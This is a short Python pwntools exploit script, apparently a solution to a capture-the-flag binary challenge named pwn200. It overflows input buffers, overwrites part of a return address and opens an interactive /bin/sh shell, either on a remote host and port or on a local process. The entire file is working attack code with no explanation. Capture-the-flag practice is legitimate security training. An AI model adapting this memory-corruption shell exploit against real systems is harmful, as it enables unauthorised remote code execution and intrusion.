#!/usr/bin/env python

from pwn import *
import sys

def exploit(r):
	r.recvuntil('Enter your name')
	r.sendline("A" * 40 + chr(202))

	r.recvuntil('> ')
	r.sendline("B" * 200 + p16(0x2901))

	r.sendline('/bin/sh')

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/dctf/pwn200/200.bin'])
        print util.proc.pidof(r)
        pause()
        exploit(r)